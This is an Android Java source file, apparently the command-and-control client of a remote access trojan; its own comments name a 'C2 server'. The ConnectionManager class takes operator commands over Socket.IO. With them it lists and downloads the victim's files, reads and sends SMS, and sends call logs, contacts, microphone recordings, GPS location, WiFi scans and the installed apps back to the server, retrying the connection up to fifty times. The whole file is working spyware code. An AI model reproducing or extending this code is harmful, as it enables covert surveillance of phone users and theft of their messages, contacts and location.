package com.remote.app;

import android.content.Context;
import android.os.Looper;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import io.socket.emitter.Emitter;

/**
 * 连接管理器 - 处理与 C2 服务器的通信
 * 
 * 兼容 Android 14+ (API 34+)
 */
public class ConnectionManager {

    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();
    private static boolean isInitialized = false;
    private static int reconnectAttempts = 0;
    private static final int MAX_RECONNECT_ATTEMPTS = 50;

    /**
     * 异步启动连接
     */
    public static void startAsync(Context con) {
        try {
            context = con;
            
            // 检查 C2 服务器是否已配置
            if (!Config.isC2ServerConfigured()) {
                Log.w(Config.LOG_TAG, "C2 服务器未配置，无法启动连接");
                return;
            }
            
            if (!isInitialized) {
                isInitialized = true;
                sendReq();
            }
        } catch (Exception ex) {
            Log.e(Config.LOG_TAG, "启动连接失败: " + ex.getMessage());
            ex.printStackTrace();
            
            // 延迟后重试
            scheduleRetry();
        }
    }

    /**
     * 初始化 Socket.IO 连接并注册监听器
     */
    public static void sendReq() {
        try {
            // 如果已有连接，直接返回
            if (ioSocket != null) {
                Log.d(Config.LOG_TAG, "Socket 连接已存在，跳过重新初始化");
                return;
            }
            
            // 获取 Socket.IO 实例
            ioSocket = IOSocket.getInstance().getIoSocket();
            
            if (ioSocket == null) {
                Log.e(Config.LOG_TAG, "无法获取 Socket 实例");
                return;
            }
            
            Log.d(Config.LOG_TAG, "注册 Socket 事件监听器");
            
            // ========== 心跳检测 ==========
            ioSocket.on(Config.MessageType.PING, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.d(Config.LOG_TAG, "收到 PING，回复 PONG");
                    ioSocket.emit(Config.MessageType.PONG);
                }
            });

            // ========== 命令处理 ==========
            ioSocket.on(Config.MessageType.ORDER, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        if (args.length == 0) {
                            Log.w(Config.LOG_TAG, "收到空的命令");
                            return;
                        }
                        
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("type");
                        
                        Log.d(Config.LOG_TAG, "收到命令: " + order);
                        
                        handleCommand(order, data);
                        
                    } catch (Exception e) {
                        Log.e(Config.LOG_TAG, "处理命令异常: " + e.getMessage());
                        e.printStackTrace();
                    }
                }
            });

            // ========== 连接事件监听 ==========
            ioSocket.on(io.socket.client.Socket.EVENT_CONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.i(Config.LOG_TAG, "Socket 已连接到服务器");
                    reconnectAttempts = 0;
                }
            });

            ioSocket.on(io.socket.client.Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    String errorMsg = args.length > 0 ? args[0].toString() : "未知错误";
                    Log.e(Config.LOG_TAG, "Socket 连接错误: " + errorMsg);
                }
            });

            ioSocket.on(io.socket.client.Socket.EVENT_DISCONNECT, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    Log.w(Config.LOG_TAG, "Socket 已断开连接");
                }
            });

            // ========== 建立连接 ==========
            Log.d(Config.LOG_TAG, "建立 Socket 连接...");
            ioSocket.connect();

        } catch (Exception ex) {
            Log.e(Config.LOG_TAG, "Socket 初始化异常: " + ex.getMessage());
            ex.printStackTrace();
            scheduleRetry();
        }
    }

    /**
     * 处理从服务器接收的命令
     */
    private static void handleCommand(String order, JSONObject data) {
        try {
            switch (order) {
                // 文件管理
                case Config.MessageType.FILE_MANAGER: // "0xFI"
                    handleFileManager(data);
                    break;
                
                // 短信管理
                case Config.MessageType.SMS_MANAGER: // "0xSM"
                    handleSMSManager(data);
                    break;
                
                // 通话记录
                case Config.MessageType.CALL_LOG: // "0xCL"
                    CL();
                    break;
                
                // 通讯录
                case Config.MessageType.CONTACTS: // "0xCO"
                    CO();
                    break;
                
                // 麦克风录音
                case Config.MessageType.MIC_RECORD: // "0xMI"
                    MI(data.getInt("sec"));
                    break;
                
                // 定位
                case Config.MessageType.LOCATION: // "0xLO"
                    LO();
                    break;
                
                // WiFi 扫描
                case Config.MessageType.WIFI_SCAN: // "0xWI"
                    WI();
                    break;
                
                // 权限检查
                case Config.MessageType.PERMISSION: // "0xPM"
                    PM();
                    break;
                
                // 应用列表
                case Config.MessageType.APP_LIST: // "0xIN"
                    IN();
                    break;
                
                // 获取单个权限状态
                case Config.MessageType.GET_PERMISSION: // "0xGP"
                    GP(data.getString("permission"));
                    break;
                
                default:
                    Log.w(Config.LOG_TAG, "未知命令: " + order);
            }
        } catch (JSONException e) {
            Log.e(Config.LOG_TAG, "命令参数解析失败: " + e.getMessage());
        }
    }

    /**
     * 处理文件管理命令
     */
    private static void handleFileManager(JSONObject data) {
        try {
            String action = data.getString("action");
            String path = data.getString("path");
            
            if ("ls".equals(action)) {
                FI(0, path);
            } else if ("dl".equals(action)) {
                FI(1, path);
            } else {
                Log.w(Config.LOG_TAG, "未知文件管理操作: " + action);
            }
        } catch (JSONException e) {
            Log.e(Config.LOG_TAG, "文件管理命令解析失败: " + e.getMessage());
        }
    }

    /**
     * 处理短信管理命令
     */
    private static void handleSMSManager(JSONObject data) {
        try {
            String action = data.getString("action");
            
            if ("ls".equals(action)) {
                SM(0, null, null);
            } else if ("sendSMS".equals(action)) {
                String to = data.getString("to");
                String sms = data.getString("sms");
                SM(1, to, sms);
            } else {
                Log.w(Config.LOG_TAG, "未知短信操作: " + action);
            }
        } catch (JSONException e) {
            Log.e(Config.LOG_TAG, "短信命令解析失败: " + e.getMessage());
        }
    }

    /**
     * 文件管理 - 列表或下载
     */
    public static void FI(int req, String path) {
        try {
            if (req == 0) {
                // 列表
                JSONObject object = new JSONObject();
                object.put("type", "list");
                object.put("list", fm.walk(path));
                ioSocket.emit(Config.MessageType.FILE_MANAGER, object);
            } else if (req == 1) {
                // 下载
                fm.downloadFile(path);
            }
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "文件管理异常: " + e.getMessage());
        }
    }

    /**
     * 短信管理 - 列表或发送
     */
    public static void SM(int req, String phoneNo, String msg) {
        try {
            if (req == 0) {
                // 获取短信列表
                ioSocket.emit(Config.MessageType.SMS_MANAGER, SMSManager.getsms());
            } else if (req == 1) {
                // 发送短信
                boolean isSent = SMSManager.sendSMS(phoneNo, msg);
                ioSocket.emit(Config.MessageType.SMS_MANAGER, isSent);
            }
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "短信管理异常: " + e.getMessage());
        }
    }

    /**
     * 获取通话记录
     */
    public static void CL() {
        try {
            ioSocket.emit(Config.MessageType.CALL_LOG, CallsManager.getCallsLogs());
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "获取通话记录异常: " + e.getMessage());
        }
    }

    /**
     * 获取通讯录
     */
    public static void CO() {
        try {
            ioSocket.emit(Config.MessageType.CONTACTS, ContactsManager.getContacts());
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "获取通讯录异常: " + e.getMessage());
        }
    }

    /**
     * 麦克风录音
     */
    public static void MI(int sec) {
        try {
            MicManager.startRecording(sec);
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "麦克风录音异常: " + e.getMessage());
        }
    }

    /**
     * WiFi 扫描
     */
    public static void WI() {
        try {
            ioSocket.emit(Config.MessageType.WIFI_SCAN, WifiScanner.scan(context));
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "WiFi 扫描异常: " + e.getMessage());
        }
    }

    /**
     * 权限检查
     */
    public static void PM() {
        try {
            ioSocket.emit(Config.MessageType.PERMISSION, PermissionManager.getGrantedPermissions());
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "权限检查异常: " + e.getMessage());
        }
    }

    /**
     * 获取应用列表
     */
    public static void IN() {
        try {
            ioSocket.emit(Config.MessageType.APP_LIST, AppList.getInstalledApps(false));
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "获取应用列表异常: " + e.getMessage());
        }
    }

    /**
     * 检查单个权限
     */
    public static void GP(String perm) {
        try {
            JSONObject data = new JSONObject();
            data.put("permission", perm);
            data.put("isAllowed", PermissionManager.canIUse(perm));
            ioSocket.emit(Config.MessageType.GET_PERMISSION, data);
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "权限检查异常: " + e.getMessage());
        }
    }

    /**
     * 获取定位信息
     */
    public static void LO() {
        try {
            Looper.prepare();
            LocManager gps = new LocManager(context);
            // 检查GPS是否启用
            if (gps.canGetLocation()) {
                ioSocket.emit(Config.MessageType.LOCATION, gps.getData());
            } else {
                Log.w(Config.LOG_TAG, "GPS 不可用");
            }
        } catch (Exception e) {
            Log.e(Config.LOG_TAG, "获取定位信息异常: " + e.getMessage());
        }
    }

    /**
     * 获取当前 Socket 连接状态
     */
    public static boolean isConnected() {
        return ioSocket != null && ioSocket.connected();
    }

    /**
     * 延迟重连
     */
    private static void scheduleRetry() {
        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
            reconnectAttempts++;
            long delayMs = Math.min(5000 * reconnectAttempts, 300000); // 最长延迟5分钟
            Log.d(Config.LOG_TAG, "将在 " + delayMs + "ms 后重试连接 (第 " + reconnectAttempts + " 次)");
            
            try {
                Thread.sleep(delayMs);
                sendReq();
            } catch (InterruptedException e) {
                Log.e(Config.LOG_TAG, "重试延迟被中断: " + e.getMessage());
            }
        } else {
            Log.e(Config.LOG_TAG, "已达到最大重试次数，停止重连");
        }
    }
}
